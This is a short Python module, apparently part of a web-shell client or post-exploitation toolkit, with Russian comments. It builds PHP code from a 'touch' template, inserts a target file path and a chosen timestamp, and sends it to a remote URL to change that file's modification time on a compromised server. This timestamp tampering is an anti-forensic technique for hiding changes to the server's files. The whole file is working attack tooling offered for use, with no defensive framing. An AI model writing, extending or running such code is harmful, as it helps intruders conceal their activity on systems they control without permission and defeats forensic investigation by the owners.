import modules.send as send
import modules.exist as exist
import calendar
import datetime

def time(url,pwd,com,uagent):
    
    file = com.split(" settime ")[0]
    time = com.split(" settime ")[1]
    date = datetime.datetime.strptime(time, '%Y-%m-%d %H:%M:%S')
    time = calendar.timegm(date.utctimetuple())

    with open('modules\\touch\\touch.php') as f:data = f.read()

    if "/" in file: #Проверка на абсолютный путь удяляемого
        if exist.file(url,file,uagent) == "1":
            data = data.replace("$cat = $_LOCAL;", f"$cat = \'{file}\';").replace("$date = $_DATE;", f"$date = \'{time}\';")
            print(send.send(url,data,uagent))
            #print(data)
        else:
            print("Файл не найден")
    else:
        if exist.file(url,pwd+'/'+file,uagent) == "1":
            data = data.replace("$cat = $_LOCAL;", f"$cat = \'{pwd+'/'+file}\';").replace("$date = $_DATE;", f"$date = \'{time}\';")
            print(send.send(url,data,uagent))
            #print(data)
        else:
            print("Файл не найден")